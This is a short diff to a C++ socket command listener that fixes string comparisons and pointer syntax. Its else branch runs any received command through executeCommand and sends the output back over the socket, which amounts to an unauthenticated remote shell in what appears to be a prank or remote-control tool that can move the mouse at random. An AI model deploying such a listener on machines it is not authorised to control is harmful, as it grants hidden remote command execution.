@@ -1,5 +1,8 @@
+#include <string.h>
 #include "CommandListener.h"
 #include "RandomMouse.h"
+
+using namespace std;
 
 CommandListener::CommandListener()
 {
@@ -41,22 +44,24 @@ void CommandListener::setupSocket()
 
 void CommandListener::handleCommand(const char* cmd)
 {
-  if(cmd=="stop")
+  // 大哥這不是python, 字串比較要用function
+  // git blame yoyopig
+  if(strcmp(cmd, "stop") == 0)
   {
     StopAllThreads sat;
     sat();
   }
-  else if(cmd == "random")
+  else if(strcmp(cmd, "random") == 0)
   {
-    RandomMouse rdm;
-    this.tp.setThread(&rdm);
+    // RandomMouse rdm;
+    // this->tp.setThread(&rdm);
   }
   else
   {
     string str = executeCommand(message);
     char *sendbuf = &str[0];
     send(sConnect,sendbuf,(int)strlen(sendbuf),0);
-    char *done = "Command executed.\n";
+    char done[30] = "Command executed.\n";
     send(sConnect,done,(int)strlen(done),0);
   }
   
